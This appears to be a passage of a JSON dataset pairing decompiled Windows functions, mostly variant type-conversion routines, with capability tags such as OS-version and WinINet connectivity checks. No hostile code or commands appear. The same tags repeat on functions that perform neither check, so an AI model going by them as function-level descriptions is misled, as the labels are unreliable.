            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412100(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x412521;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412133\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.00410e60();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411f68();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.0041201c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411f68();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00412058();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.004120bc();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.0041201c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412357\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.0041201c();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411f68();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00412100();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00412100();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.00404518();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1818
    },
    "00412550": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412550(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x492a5c != '\\0') {\n            puStack24 = 0x412590;\n            fcn.00410e60();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x4125de;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412100();\n        if (0xff < uVar2 + 0x80) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 318
    },
    "00412604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412604(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x492a5c != '\\0') {\n            puStack24 = 0x412644;\n            fcn.00410e60();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x412689;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412100();\n        if (0xff < uVar2) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 312
    },
    "004126ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004126ac(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (18 cases) at 0x4126e5\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack24 = 0x41271e;\n            fcn.00410e60();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x412781;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.00412100();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 347
    },
    "004127a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004127a4(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (19 cases) at 0x4127da\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack24 = 0x41280c;\n            fcn.00410e60();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x41285a;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.00412100();\n        if (0xffff < uVar1) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 321
    },
    "00412880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412880(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (20 cases) at 0x4128bb\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack24 = 0x4128f4;\n            fcn.00410e60();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x412946;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412bd0();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 368
    },
    "00412bd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00412bd0(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x412fdc;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412c03\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.00410e60();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412a18();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.0041296c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412a18();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412b18();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00412b84();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.0041296c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412e27\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.0041296c();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412a18();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412bd0();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.00412bd0();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1249
    },
    "004131c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004131c8(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    bool bVar4;\n    uint32_t uStack8;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4131e2\n    switch(uVar1) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            fcn.00410e60();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413518;\n        break;\n    case 5:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413518;\n        break;\n    case 6:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413518;\n        break;\n    case 7:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413518;\n        break;\n    case 8:\n        uVar2 = fcn.00413014();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 9:\n    case 0xd:\n        uVar2 = fcn.004130d8();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            uVar2 = fcn.00413014();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if (uVar1 == 0x101) {\n            uVar2 = fcn.00413118();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar3 = fcn.0041317c();\n            uStack8 = param_1;\n            if (cVar3 == '\\0') {\n                uVar2 = fcn.004130d8();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4133a8\n            switch(uVar1 & 0xbfff) {\n            default:\n                uVar2 = fcn.004130d8();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 2:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 3:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 4:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413518;\n                break;\n            case 5:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413518;\n                break;\n            case 6:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413518;\n                break;\n            case 7:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413518;\n                break;\n            case 8:\n                uVar2 = fcn.00413014();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0xb:\n                uStack8 = param_1 & 0xffffff00 | 1 - (**(in_EAX + 4) == 0);\n                break;\n            case 0xc:\n                uVar2 = fcn.004131c8();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0x10:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x11:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x12:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x13:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x14:\n                bVar4 = (*(in_EAX + 4))[1] == 0;\n                if (bVar4) {\n                    bVar4 = **(in_EAX + 4) == 0;\n                }\n                uStack8 = param_1 & 0xffffff00 | !bVar4;\n            }\n        }\n        break;\n    case 0xb:\n        uStack8 = param_1 & 0xffffff00 | 1 - (in_EAX[4] == 0);\n        break;\n    case 0xc:\n        uVar2 = fcn.004131c8();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar4 = *(in_EAX + 6) == 0;\n        if (bVar4) {\n            bVar4 = *(in_EAX + 4) == 0;\n        }\n        uStack8 = param_1 & 0xffffff00 | !bVar4;\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 1596
    },
    "004136dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004136dc(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4136f8\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            fcn.00410e60();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x413a50;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.0041351c();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.004135e0();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.0041351c();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.0041362c();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.00413690();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.004135e0();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4138d4\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.004135e0();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x413a50;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.0041351c();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.004136dc();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.004136dc();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1064
    },
    "00413a54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413a54(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x413a76\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            puStack40 = 0x413aea;\n            fcn.00410e60();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x413bb9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.004136dc();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 479
    },
    "00413e2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413e2c(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x413e48\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x413ec0, uVar4);\n            fcn.00410e60();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x413eed, uVar4);\n        fcn.00413d30();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x413f0f, uVar4);\n        fcn.00413be4();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x413fb8, uVar4);\n        fcn.00413d30();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x413fd8, uVar4);\n            fcn.00413be4();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x413fe8, uVar4);\n            fcn.00413d7c();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x414162, uVar4);\n            cVar2 = fcn.00413de0();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x41416d, SUB84(in_stack_ffffffe0, 0));\n                fcn.00413d30();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414012\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x414153, uVar4);\n                fcn.00413d30();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x414089, uVar4);\n                fcn.00413d30();\n                break;\n            case 7:\n                break;\n            case 8:\n                